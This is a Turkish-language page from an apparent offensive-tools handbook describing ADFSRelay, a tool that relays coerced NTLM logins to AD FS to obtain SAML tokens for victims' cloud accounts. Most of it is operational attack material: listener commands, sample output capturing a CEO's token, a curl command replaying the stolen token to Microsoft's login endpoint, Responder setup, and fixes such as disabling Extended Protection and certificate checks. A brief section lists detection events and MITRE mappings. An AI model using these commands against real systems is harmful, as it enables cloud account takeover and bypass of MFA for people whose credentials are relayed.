# ADFSRelay

> **Kategori:** [14. AD FS, Bulut ve Hibrit Kimlik](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Ağda yakalanan NTLM kimlik doğrulama isteklerini Active Directory Federasyon Servislerine (AD FS) relay ederek kurban kullanıcı adına meşru SAML belirteçleri (SAML Tokens) üreten ve federatif bulut kaynaklarına (Office 365, Azure AD, AWS SSO) sızmayı sağlayan federasyon relay aracı.

---

## 1. Genel Bakış ve Amaç

Kurumsal yapılarda şirket içi Active Directory ile bulut servisleri (Microsoft 365, Salesforce, AWS, ServiceNow) arasındaki Single Sign-On (SSO) köprüsü **Active Directory Federation Services (AD FS)** tarafından sağlanır. AD FS, kullanıcıların şirket içi kimlik bilgileriyle doğrulama yapıp bulut sağlayıcılarına iletilmek üzere imzalı bir **SAML 2.0 veya WS-Federation belirteci** almasını mümkün kılar.

AD FS sunucuları varsayılan olarak Windows Tümleşik Kimlik Doğrulaması'nı (WIA) destekler ve intranet istemcileri için HTTP NTLM kimlik doğrulamasını kabul eder.

**`ADFSRelay`** (Praetorian araştırmacıları tarafından geliştirilen), zorlamalı kimlik doğrulama (PetitPotam, PrinterBug, LLMNR poisoning) ile elde edilen NTLM bağlantılarını AD FS uç noktalarına relay eder. Bu sayede kurban kullanıcının parolası bilinmeden, AD FS'ten geçerli bir SAML belirteci alınır ve kurbanın buluttaki e-postalarına, OneDrive dosyalarına veya kurumsal bulut panellerine doğrudan erişilir.

### Mimari Akış Şeması

```
[ Kurban İstemci / Yönetici ]                     [ Saldırgan / ADFSRelay ]                         [ AD FS Sunucusu ]               [ Bulut (M365 / Azure AD) ]
             │                                               │                                             │                                 │
             ├─── (1) Zorlamalı NTLM Kimlik Doğrulama ──────►│ (HTTP / SMB Dinleyici)                      │                                 │
             │                                               │                                             │                                 │
             │                                               ├─── (2) NTLM Relay Başlat (WIA Endpoint) ───►│                                 │
             │                                               │    /adfs/ls/?wa=wsignin1.0                  │                                 │
             │                                               │                                             │                                 │
             │◄── (3) NTLM Challenge (Type 2) ───────────────┤◄─── (3) NTLM Challenge ─────────────────────┤                                 │
             │                                               │                                             │                                 │
             ├─── (4) NTLM Auth Response (Type 3) ──────────►│                                             │                                 │
             │                                               ├─── (4) NTLM Auth İlet ─────────────────────►│                                 │
             │                                               │                                             │                                 │
             │                                               │◄── (5) İmzalı SAML Belirteci (Token) ───────┤ (Meşru Kullanıcı Olarak Kabul)  │
             │                                               │                                             │                                 │
             │                                               ├─── (6) SAML Belirtecini Buluta Post Et ──────────────────────────────────────►│
             │                                               │                                                                               │
             │                                               │◄── (7) Bulut Oturumu ve Çerezleri (ESTSAUTH) ─────────────────────────────────┤
             │                                               ▼                                                                               ▼
             │                                       [ Bulut Hesabı Ele Geçirildi! (MFA ve Parola Atlama) ]
```

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
python3 ADFSRelay.py -targetSite <ADFS_URL> [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-targetSite` | Hedef AD FS sunucusunun tam HTTPS adresi (Zorunlu) | `-targetSite https://sts.corp.local` |
| `-port` | Saldırgan makinesinde NTLM bağlantılarını karşılayacak yerel HTTP dinleme portu | `-port 8080` |
| `-debug` | Hata ayıklama modunu açar ve tüm HTTP başlıklarını ekrana döker | `-debug` |
| `-spn` | Hedef servis için özel SPN tanımı | `-spn HTTP/sts.corp.local` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: AD FS Üzerinden M365 SAML Belirteci Çalma

```bash
# 1. ADFSRelay dinleyicisini başlatma
python3 ADFSRelay.py -targetSite https://sts.corp.local -port 8080 -debug

# 2. Ağda veya kurban üzerinde HTTP yönlendirmesi tetikleme (Örn: LNKUp veya Coercer ile)
# Kurban istemci http://10.0.0.5:8080 adresine NTLM bağlantısı kurar
```

*Çıktı Analizi:*
```text
[+] ADFSRelay listening on port 8080...
[*] Incoming connection from 10.0.0.45!
[*] Relaying NTLM negotiation to https://sts.corp.local/adfs/ls/
[+] NTLM authentication SUCCEEDED for CORP\ceo_user!
[+] Successfully extracted SAML 2.0 Assertion Token!
[+] Token saved to: /tmp/saml_token_ceo.xml
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Çözüm Adımı |
|---|---|---|
| `HTTP 401 Unauthorized / Access Denied` | AD FS sunucusunda EPA (Extended Protection for Authentication) zorunludur veya NTLM WIA devre dışıdır. | AD FS farmında EPA politikasını kontrol edin; `Set-AdfsProperties -ExtendedProtectionTokenCheck None` gereklidir. |
| `SSL: CERTIFICATE_VERIFY_FAILED` | AD FS kurumsal iç CA tarafından imzalanmış bir SSL sertifikası kullanıyordur. | Kendi CA kök sertifikanızı sisteme ekleyin veya scriptte SSL doğrulamasını devre dışı bırakın (`verify=False`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler
* **AD FS Olay Günlükleri (Event ID 1200):** AD FS sunucusunda `Fresh credential authentication succeeded` kaydı.
* **Security Event ID 4624:** AD FS sunucusunda Logon Type 3 (NTLMSSP) kaydı.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım |
|---|---|---|
| **[T1557.001](https://attack.mitre.org/techniques/T1557/001/)** | Adversary-in-the-Middle: NTLM Relay | AD FS sunucusuna HTTP NTLM relay. |
| **[T1606.002](https://attack.mitre.org/techniques/T1606/002/)** | Forge Web Credentials: SAML Tokens | Meşru SAML belirteçlerinin hasadı. |

---

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```bash
# 1. Temel ADFSRelay dinleyicisi başlatma
python3 ADFSRelay.py -targetSite https://sts.corp.local

# 2. Özel port ve hata ayıklama moduyla çalıştırma
python3 ADFSRelay.py -targetSite https://adfs.company.com -port 8888 -debug

# 3. Alınan SAML belirtecini curl ile M365 uç noktasına iletme
curl -X POST https://login.microsoftonline.com/login.srf --data-urlencode "wresult@/tmp/saml_token_ceo.xml"

# 4. Responder ile HTTP trafiğini ADFSRelay portuna yönlendirme
# Responder.conf içinde HTTP = Off yaparak ADFSRelay'e alan açın
```

---

## Kaynaklar
- [Praetorian Research — Relaying NTLM to AD FS](https://www.praetorian.com/blog/)
- [Microsoft Docs — Configuring AD FS Extranet Smart Lockout and WIA](https://learn.microsoft.com/)

---

> **Önceki:** [← ADFSpoof](./ADFSpoof.md) · **Sonraki:** [ROADtools →](./ROADtools_roadrecon.md)
